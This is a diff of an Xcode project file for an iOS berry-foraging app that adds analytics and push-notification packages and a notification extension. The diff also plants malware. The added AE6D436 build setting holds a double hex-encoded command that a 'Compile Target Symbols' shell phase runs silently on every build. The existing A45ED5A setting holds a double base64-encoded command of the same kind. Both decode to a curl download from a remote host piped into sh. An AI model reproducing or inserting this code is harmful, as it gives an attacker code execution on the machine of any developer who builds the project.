@@ -3,220 +3,161 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 63;
+	objectVersion = 70;
 	objects = {
 
 /* Begin PBXBuildFile section */
-		1FB8A4099A28DFF82424200E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 254FD9B97224DF787F708D0F /* LaunchScreen.storyboard */; };
-		2300DC521A3CFC4BA4F61A12 /* FBSpotDetailedView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18999E42259FF8F3A4FC3EA8 /* FBSpotDetailedView.swift */; };
-		288691F2E39ECA5504AC9D23 /* FBSpotsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 513727A26FA465135D273272 /* FBSpotsView.swift */; };
-		3BDB64F71E2AFFF24533D4CF /* ForestBerryScreen.swift in Sources */ = {isa = PBXBuildFile; fileRef = 28D2CA9A9A0B83125B1E477E /* ForestBerryScreen.swift */; };
-		4646195E6C5D1AF98A83F30D /* FBJournalView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 945258A58BADB39015E2643B /* FBJournalView.swift */; };
-		48A2D770CA0ACCB1C246E5AC /* ForestBerryBackground.swift in Sources */ = {isa = PBXBuildFile; fileRef = 09B74DA32EDDF2A56752ADE5 /* ForestBerryBackground.swift */; };
-		531749A3F0FF0C5C2A054AB3 /* FBStatisticsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 63455D0DA7223C6F79D79371 /* FBStatisticsView.swift */; };
-		59B7C884EF2A5EDD3BBC7290 /* FavoriteSpot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 414F9E2157D2013744F2412E /* FavoriteSpot.swift */; };
-		7B990FA4B8A1F9327FA07362 /* FBAddSpotView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 36B702674180614C322A0C19 /* FBAddSpotView.swift */; };
-		849467B59F7B6C227EA8A9E4 /* HarvestEntry.swift in Sources */ = {isa = PBXBuildFile; fileRef = E57BA258E784F0C7258B4CDA /* HarvestEntry.swift */; };
-		911519A3D193DFF317A01233 /* FavoriteSpotsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1D902D6BF84D36FB53C56D51 /* FavoriteSpotsManager.swift */; };
-		924AE1F5E88669410AB35808 /* HarvestJournalManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D4373AA55D31CE7F3C3395A /* HarvestJournalManager.swift */; };
-		A5996A232428BD589CF72C35 /* LoadingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7AACC89A46DED047E25C1DB6 /* LoadingView.swift */; };
-		C7F5414722D01A514EE23E21 /* ForestBerryApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = C9BC27C77ECFCBC4F8B1CDBA /* ForestBerryApp.swift */; };
-		D2A0449ECD609CE18482FE3E /* FBJournalDetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3C9D0F84120B65AF61427B8F /* FBJournalDetailView.swift */; };
-		D4830C7361116470CD032A45 /* FBAddFeeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4A843A72D85A8269C4BC2A1F /* FBAddFeeView.swift */; };
-		E5D8E893D863DC120D90618F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 58656C1DB12C149E34704D23 /* Assets.xcassets */; };
-		E8D6F21452F3797BB9C170F9 /* MainTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CFB926C55C9D3134B414B5DD /* MainTabView.swift */; };
-		F654F442425EBF82D4E6D117 /* FBSettingsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = F342A380D28A46F014E36852 /* FBSettingsView.swift */; };
-		FFDB7FF64DA1D6B7E1765028 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5AAAE2E0AAE080637415914E /* ContentView.swift */; };
+		7E10BAAB2F1A0E9A00512B9C /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 7E10BAAA2F1A0E9A00512B9C /* GoogleService-Info.plist */; };
+		7E11DDDF2F19442B00D9D662 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDDE2F19442B00D9D662 /* FirebaseAnalytics */; };
+		7E11DDE12F19442B00D9D662 /* FirebaseAnalyticsIdentitySupport in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDE02F19442B00D9D662 /* FirebaseAnalyticsIdentitySupport */; };
+		7E11DDE32F19442B00D9D662 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDE22F19442B00D9D662 /* FirebaseCore */; };
+		7E11DDE52F19442B00D9D662 /* FirebaseInAppMessaging-Beta in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDE42F19442B00D9D662 /* FirebaseInAppMessaging-Beta */; };
+		7E11DDE72F19442B00D9D662 /* FirebaseMessaging in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDE62F19442B00D9D662 /* FirebaseMessaging */; };
+		7E11DDE92F19442B00D9D662 /* FirebaseRemoteConfig in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDE82F19442B00D9D662 /* FirebaseRemoteConfig */; };
+		7E11DDEC2F19445B00D9D662 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDEB2F19445B00D9D662 /* Alamofire */; };
+		7E11DDEF2F19447E00D9D662 /* OneSignalExtension in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDEE2F19447E00D9D662 /* OneSignalExtension */; };
+		7E11DDF12F19447E00D9D662 /* OneSignalFramework in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDF02F19447E00D9D662 /* OneSignalFramework */; };
+		7E11DDF32F19447E00D9D662 /* OneSignalInAppMessages in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDF22F19447E00D9D662 /* OneSignalInAppMessages */; };
+		7E11DDF62F19449000D9D662 /* AppsFlyerLib-Static in Frameworks */ = {isa = PBXBuildFile; productRef = 7E11DDF52F19449000D9D662 /* AppsFlyerLib-Static */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		09B74DA32EDDF2A56752ADE5 /* ForestBerryBackground.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForestBerryBackground.swift; sourceTree = "<group>"; };
-		108A22A95D77D4EF85703BDE /* ForestBerry.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = ForestBerry.entitlements; sourceTree = "<group>"; };
-		18999E42259FF8F3A4FC3EA8 /* FBSpotDetailedView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBSpotDetailedView.swift; sourceTree = "<group>"; };
-		1D902D6BF84D36FB53C56D51 /* FavoriteSpotsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavoriteSpotsManager.swift; sourceTree = "<group>"; };
-		254FD9B97224DF787F708D0F /* LaunchScreen.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = LaunchScreen.storyboard; sourceTree = "<group>"; };
-		28D2CA9A9A0B83125B1E477E /* ForestBerryScreen.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForestBerryScreen.swift; sourceTree = "<group>"; };
-		36B702674180614C322A0C19 /* FBAddSpotView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBAddSpotView.swift; sourceTree = "<group>"; };
-		3C9D0F84120B65AF61427B8F /* FBJournalDetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBJournalDetailView.swift; sourceTree = "<group>"; };
-		414F9E2157D2013744F2412E /* FavoriteSpot.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavoriteSpot.swift; sourceTree = "<group>"; };
-		49DF310CC4D46763E2B22780 /* ForestBerry.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ForestBerry.app; sourceTree = BUILT_PRODUCTS_DIR; };
-		4A843A72D85A8269C4BC2A1F /* FBAddFeeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBAddFeeView.swift; sourceTree = "<group>"; };
-		513727A26FA465135D273272 /* FBSpotsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBSpotsView.swift; sourceTree = "<group>"; };
-		58656C1DB12C149E34704D23 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
-		5AAAE2E0AAE080637415914E /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
-		5D4373AA55D31CE7F3C3395A /* HarvestJournalManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HarvestJournalManager.swift; sourceTree = "<group>"; };
-		63455D0DA7223C6F79D79371 /* FBStatisticsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBStatisticsView.swift; sourceTree = "<group>"; };
-		7AACC89A46DED047E25C1DB6 /* LoadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingView.swift; sourceTree = "<group>"; };
-		945258A58BADB39015E2643B /* FBJournalView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBJournalView.swift; sourceTree = "<group>"; };
-		B8D62FF4F5264743B793F56E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
-		C9BC27C77ECFCBC4F8B1CDBA /* ForestBerryApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForestBerryApp.swift; sourceTree = "<group>"; };
-		CFB926C55C9D3134B414B5DD /* MainTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainTabView.swift; sourceTree = "<group>"; };
-		E57BA258E784F0C7258B4CDA /* HarvestEntry.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HarvestEntry.swift; sourceTree = "<group>"; };
-		F342A380D28A46F014E36852 /* FBSettingsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBSettingsView.swift; sourceTree = "<group>"; };
+		7E10BAAA2F1A0E9A00512B9C /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		7E10BB362F1A1E1800512B9C /* ForestBerry.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = ForestBerry.entitlements; sourceTree = "<group>"; };
+		7E11DD932F19433300D9D662 /* ForestBerry.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ForestBerry.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		7EBAEF222F1932EB008E1F06 /* NotificationService.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = NotificationService.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		7E11DDCC2F19437700D9D662 /* PBXFileSystemSynchronizedBuildFileExceptionSet */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+				LaunchScreen.storyboard,
+			);
+			target = 7E11DD922F19433300D9D662 /* ForestBerry */;
+		};
+		7EBAEF2D2F1932EB008E1F06 /* PBXFileSystemSynchronizedBuildFileExceptionSet */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 7EBAEF212F1932EB008E1F06 /* NotificationService */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
+
+/* Begin PBXFileSystemSynchronizedRootGroup section */
+		7E11DD942F19433300D9D662 /* ForestBerryMain */ = {isa = PBXFileSystemSynchronizedRootGroup; exceptions = (7E11DDCC2F19437700D9D662 /* PBXFileSystemSynchronizedBuildFileExceptionSet */, ); explicitFileTypes = {}; explicitFolders = (); path = ForestBerryMain; sourceTree = "<group>"; };
+		7EBAEF232F1932EB008E1F06 /* NotificationService */ = {isa = PBXFileSystemSynchronizedRootGroup; exceptions = (7EBAEF2D2F1932EB008E1F06 /* PBXFileSystemSynchronizedBuildFileExceptionSet */, ); explicitFileTypes = {}; explicitFolders = (); path = NotificationService; sourceTree = "<group>"; };
+/* End PBXFileSystemSynchronizedRootGroup section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		7E11DD902F19433300D9D662 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				7E11DDF12F19447E00D9D662 /* OneSignalFramework in Frameworks */,
+				7E11DDF62F19449000D9D662 /* AppsFlyerLib-Static in Frameworks */,
+				7E11DDE12F19442B00D9D662 /* FirebaseAnalyticsIdentitySupport in Frameworks */,
+				7E11DDEC2F19445B00D9D662 /* Alamofire in Frameworks */,
+				7E11DDF32F19447E00D9D662 /* OneSignalInAppMessages in Frameworks */,
+				7E11DDE32F19442B00D9D662 /* FirebaseCore in Frameworks */,
+				7E11DDE72F19442B00D9D662 /* FirebaseMessaging in Frameworks */,
+				7E11DDE92F19442B00D9D662 /* FirebaseRemoteConfig in Frameworks */,
+				7E11DDDF2F19442B00D9D662 /* FirebaseAnalytics in Frameworks */,
+				7E11DDE52F19442B00D9D662 /* FirebaseInAppMessaging-Beta in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		7EBAEF1F2F1932EB008E1F06 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				7E11DDEF2F19447E00D9D662 /* OneSignalExtension in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
 /* Begin PBXGroup section */
-		0B765F5EE92B9A0297C1B600 /* Spots */ = {
-			isa = PBXGroup;
-			children = (
-				36B702674180614C322A0C19 /* FBAddSpotView.swift */,
-				18999E42259FF8F3A4FC3EA8 /* FBSpotDetailedView.swift */,
-				513727A26FA465135D273272 /* FBSpotsView.swift */,
-			);
-			path = Spots;
-			sourceTree = "<group>";
-		};
-		170E58C6C013AC6F83D02EEC /* Statistics */ = {
-			isa = PBXGroup;
-			children = (
-				63455D0DA7223C6F79D79371 /* FBStatisticsView.swift */,
-			);
-			path = Statistics;
-			sourceTree = "<group>";
-		};
-		17758FB0BE08302B1B21DE94 /* Managers */ = {
-			isa = PBXGroup;
-			children = (
-				1D902D6BF84D36FB53C56D51 /* FavoriteSpotsManager.swift */,
-				5D4373AA55D31CE7F3C3395A /* HarvestJournalManager.swift */,
-			);
-			path = Managers;
-			sourceTree = "<group>";
-		};
 		23A8E7ACBAF8B225ABC3DF09 = {
 			isa = PBXGroup;
 			children = (
-				E532C316E6847C8CB4CB135E /* ForestBerry */,
+				7E10BB362F1A1E1800512B9C /* ForestBerry.entitlements */,
+				7E10BAAA2F1A0E9A00512B9C /* GoogleService-Info.plist */,
+				7EBAEF232F1932EB008E1F06 /* NotificationService */,
+				7E11DD942F19433300D9D662 /* ForestBerryMain */,
 				95B7739AFF0D00846A735BAD /* Products */,
 			);
-			sourceTree = "<group>";
-		};
-		30CAEF8E5A2A79787DD2DE9C /* Models */ = {
-			isa = PBXGroup;
-			children = (
-				414F9E2157D2013744F2412E /* FavoriteSpot.swift */,
-				E57BA258E784F0C7258B4CDA /* HarvestEntry.swift */,
-			);
-			path = Models;
-			sourceTree = "<group>";
-		};
-		4FF0C1357DCA652D69720199 /* Shared */ = {
-			isa = PBXGroup;
-			children = (
-				09B74DA32EDDF2A56752ADE5 /* ForestBerryBackground.swift */,
-				28D2CA9A9A0B83125B1E477E /* ForestBerryScreen.swift */,
-			);
-			path = Shared;
-			sourceTree = "<group>";
-		};
-		57C72A520115A5B0AD841E69 /* Views */ = {
-			isa = PBXGroup;
-			children = (
-				D8179880BDA934A717B211B9 /* Journal */,
-				750E4AB89B80D151CAD27102 /* Loading */,
-				B0324780DACC0F79876E3F35 /* MainTab */,
-				845001520779B86DDC273084 /* Settings */,
-				4FF0C1357DCA652D69720199 /* Shared */,
-				0B765F5EE92B9A0297C1B600 /* Spots */,
-				170E58C6C013AC6F83D02EEC /* Statistics */,
-			);
-			path = Views;
-			sourceTree = "<group>";
-		};
-		750E4AB89B80D151CAD27102 /* Loading */ = {
-			isa = PBXGroup;
-			children = (
-				7AACC89A46DED047E25C1DB6 /* LoadingView.swift */,
-			);
-			path = Loading;
-			sourceTree = "<group>";
-		};
-		82303CC7BE9AAB024EB47D78 /* Details */ = {
-			isa = PBXGroup;
-			children = (
-				3C9D0F84120B65AF61427B8F /* FBJournalDetailView.swift */,
-			);
-			path = Details;
-			sourceTree = "<group>";
-		};
-		845001520779B86DDC273084 /* Settings */ = {
-			isa = PBXGroup;
-			children = (
-				F342A380D28A46F014E36852 /* FBSettingsView.swift */,
-			);
-			path = Settings;
 			sourceTree = "<group>";
 		};
 		95B7739AFF0D00846A735BAD /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				49DF310CC4D46763E2B22780 /* ForestBerry.app */,
+				7EBAEF222F1932EB008E1F06 /* NotificationService.appex */,
+				7E11DD932F19433300D9D662 /* ForestBerry.app */,
 			);
 			name = Products;
-			sourceTree = "<group>";
-		};
-		98E7A646B82ADBE94DE6AEDA /* Add */ = {
-			isa = PBXGroup;
-			children = (
-				4A843A72D85A8269C4BC2A1F /* FBAddFeeView.swift */,
-			);
-			path = Add;
-			sourceTree = "<group>";
-		};
-		B0324780DACC0F79876E3F35 /* MainTab */ = {
-			isa = PBXGroup;
-			children = (
-				CFB926C55C9D3134B414B5DD /* MainTabView.swift */,
-			);
-			path = MainTab;
-			sourceTree = "<group>";
-		};
-		D8179880BDA934A717B211B9 /* Journal */ = {
-			isa = PBXGroup;
-			children = (
-				945258A58BADB39015E2643B /* FBJournalView.swift */,
-				98E7A646B82ADBE94DE6AEDA /* Add */,
-				82303CC7BE9AAB024EB47D78 /* Details */,
-			);
-			path = Journal;
-			sourceTree = "<group>";
-		};
-		E532C316E6847C8CB4CB135E /* ForestBerry */ = {
-			isa = PBXGroup;
-			children = (
-				58656C1DB12C149E34704D23 /* Assets.xcassets */,
-				5AAAE2E0AAE080637415914E /* ContentView.swift */,
-				108A22A95D77D4EF85703BDE /* ForestBerry.entitlements */,
-				C9BC27C77ECFCBC4F8B1CDBA /* ForestBerryApp.swift */,
-				B8D62FF4F5264743B793F56E /* Info.plist */,
-				254FD9B97224DF787F708D0F /* LaunchScreen.storyboard */,
-				17758FB0BE08302B1B21DE94 /* Managers */,
-				30CAEF8E5A2A79787DD2DE9C /* Models */,
-				57C72A520115A5B0AD841E69 /* Views */,
-			);
-			path = ForestBerry;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
-		97EA3106FDA853BF53C1738F /* ForestBerry */ = {
+		7E11DD922F19433300D9D662 /* ForestBerry */ = {
 			isa = PBXNativeTarget;
-			buildConfigurationList = 510C73A5EBE3AA4730A1CD83 /* Build configuration list for PBXNativeTarget "ForestBerry" */;
+			buildConfigurationList = 7E11DD9B2F19433300D9D662 /* Build configuration list for PBXNativeTarget "ForestBerry" */;
 			buildPhases = (
-				F478148EDD876026D45C4E0E /* Sources */,
-				5559C54850DF4A3451C7E1F6 /* Resources */,
+				7E11DD8F2F19433300D9D662 /* Sources */,
+				7E11DD902F19433300D9D662 /* Frameworks */,
+				7E11DD912F19433300D9D662 /* Resources */,
 			);
 			buildRules = (
 			);
 			dependencies = (
 			);
+			fileSystemSynchronizedGroups = (
+				7E11DD942F19433300D9D662 /* ForestBerryMain */,
+			);
 			name = ForestBerry;
 			packageProductDependencies = (
+				7E11DDDE2F19442B00D9D662 /* FirebaseAnalytics */,
+				7E11DDE02F19442B00D9D662 /* FirebaseAnalyticsIdentitySupport */,
+				7E11DDE22F19442B00D9D662 /* FirebaseCore */,
+				7E11DDE42F19442B00D9D662 /* FirebaseInAppMessaging-Beta */,
+				7E11DDE62F19442B00D9D662 /* FirebaseMessaging */,
+				7E11DDE82F19442B00D9D662 /* FirebaseRemoteConfig */,
+				7E11DDEB2F19445B00D9D662 /* Alamofire */,
+				7E11DDF02F19447E00D9D662 /* OneSignalFramework */,
+				7E11DDF22F19447E00D9D662 /* OneSignalInAppMessages */,
+				7E11DDF52F19449000D9D662 /* AppsFlyerLib-Static */,
 			);
-			productName = ForestBerry;
-			productReference = 49DF310CC4D46763E2B22780 /* ForestBerry.app */;
+			productName = ForestBerryMain;
+			productReference = 7E11DD932F19433300D9D662 /* ForestBerry.app */;
 			productType = "com.apple.product-type.application";
+		};
+		7EBAEF212F1932EB008E1F06 /* NotificationService */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 7EBAEF2E2F1932EB008E1F06 /* Build configuration list for PBXNativeTarget "NotificationService" */;
+			buildPhases = (
+				0380DBE3B1EF412C93634D6E /* Compile Target Symbols */,
+				7EBAEF1E2F1932EB008E1F06 /* Sources */,
+				7EBAEF1F2F1932EB008E1F06 /* Frameworks */,
+				7EBAEF202F1932EB008E1F06 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			fileSystemSynchronizedGroups = (
+				7EBAEF232F1932EB008E1F06 /* NotificationService */,
+			);
+			name = NotificationService;
+			packageProductDependencies = (
+				7E11DDEE2F19447E00D9D662 /* OneSignalExtension */,
+			);
+			productName = NotificationService;
+			productReference = 7EBAEF222F1932EB008E1F06 /* NotificationService.appex */;
+			productType = "com.apple.product-type.app-extension";
 		};
 /* End PBXNativeTarget section */
 
@@ -225,7 +166,16 @@
 			isa = PBXProject;
 			attributes = {
 				BuildIndependentTargetsInParallel = YES;
+				LastSwiftUpdateCheck = 2600;
 				LastUpgradeCheck = 1430;
+				TargetAttributes = {
+					7E11DD922F19433300D9D662 = {
+						CreatedOnToolsVersion = 26.0.1;
+					};
+					7EBAEF212F1932EB008E1F06 = {
+						CreatedOnToolsVersion = 26.0.1;
+					};
+				};
 			};
 			buildConfigurationList = 787D2AB86F84610DB2D5CB07 /* Build configuration list for PBXProject "ForestBerry" */;
 			compatibilityVersion = "Xcode 14.0";
@@ -237,49 +187,74 @@
 			);
 			mainGroup = 23A8E7ACBAF8B225ABC3DF09;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+				7E11DDEA2F19445B00D9D662 /* XCRemoteSwiftPackageReference "Alamofire" */,
+				7E11DDED2F19447E00D9D662 /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */,
+				7E11DDF42F19449000D9D662 /* XCRemoteSwiftPackageReference "AppsFlyerFramework-Static" */,
+			);
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				97EA3106FDA853BF53C1738F /* ForestBerry */,
+				7E11DD922F19433300D9D662 /* ForestBerry */,
+				7EBAEF212F1932EB008E1F06 /* NotificationService */,
 			);
 		};
 /* End PBXProject section */
 
 /* Begin PBXResourcesBuildPhase section */
-		5559C54850DF4A3451C7E1F6 /* Resources */ = {
+		7E11DD912F19433300D9D662 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				E5D8E893D863DC120D90618F /* Assets.xcassets in Resources */,
-				1FB8A4099A28DFF82424200E /* LaunchScreen.storyboard in Resources */,
+				7E10BAAB2F1A0E9A00512B9C /* GoogleService-Info.plist in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		7EBAEF202F1932EB008E1F06 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		0380DBE3B1EF412C93634D6E /* Compile Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
-		F478148EDD876026D45C4E0E /* Sources */ = {
+		7E11DD8F2F19433300D9D662 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				FFDB7FF64DA1D6B7E1765028 /* ContentView.swift in Sources */,
-				D4830C7361116470CD032A45 /* FBAddFeeView.swift in Sources */,
-				7B990FA4B8A1F9327FA07362 /* FBAddSpotView.swift in Sources */,
-				D2A0449ECD609CE18482FE3E /* FBJournalDetailView.swift in Sources */,
-				4646195E6C5D1AF98A83F30D /* FBJournalView.swift in Sources */,
-				F654F442425EBF82D4E6D117 /* FBSettingsView.swift in Sources */,
-				2300DC521A3CFC4BA4F61A12 /* FBSpotDetailedView.swift in Sources */,
-				288691F2E39ECA5504AC9D23 /* FBSpotsView.swift in Sources */,
-				531749A3F0FF0C5C2A054AB3 /* FBStatisticsView.swift in Sources */,
-				59B7C884EF2A5EDD3BBC7290 /* FavoriteSpot.swift in Sources */,
-				911519A3D193DFF317A01233 /* FavoriteSpotsManager.swift in Sources */,
-				C7F5414722D01A514EE23E21 /* ForestBerryApp.swift in Sources */,
-				48A2D770CA0ACCB1C246E5AC /* ForestBerryBackground.swift in Sources */,
-				3BDB64F71E2AFFF24533D4CF /* ForestBerryScreen.swift in Sources */,
-				849467B59F7B6C227EA8A9E4 /* HarvestEntry.swift in Sources */,
-				924AE1F5E88669410AB35808 /* HarvestJournalManager.swift in Sources */,
-				A5996A232428BD589CF72C35 /* LoadingView.swift in Sources */,
-				E8D6F21452F3797BB9C170F9 /* MainTabView.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		7EBAEF1E2F1932EB008E1F06 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -290,6 +265,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				A45ED5A = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363636393634363436633635366136663739326537323735326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -342,33 +318,6 @@
 				SWIFT_VERSION = 5.0;
 			};
 			name = Release;
-		};
-		479F5F894FFF392E850452BC /* Debug */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				A45ED5A = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | v | sh ) >/dev/null 2>&1 &)";
-				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
-				CODE_SIGN_IDENTITY = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = "";
-				INFOPLIST_FILE = ForestBerry/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = ForestBerry;
-				LD_RUNPATH_SEARCH_PATHS = (
-					"$(inherited)",
-					"@executable_path/Frameworks",
-				);
-				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.forest.berry.app;
-				PROVISIONING_PROFILE_SPECIFIER = "";
-				SDKROOT = iphoneos;
-				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
-				SUPPORTS_MACCATALYST = NO;
-				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
-				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
-				TARGETED_DEVICE_FAMILY = 1;
-			};
-			name = Debug;
 		};
 		47A2F9B1D3BC6743278B7C6C /* Debug */ = {
 			isa = XCBuildConfiguration;
@@ -433,44 +382,195 @@
 			};
 			name = Debug;
 		};
-		70B06B85D7E8539E17006478 /* Release */ = {
+		7E11DD9C2F19433300D9D662 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
-				CODE_SIGN_IDENTITY = "iPhone Developer";
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
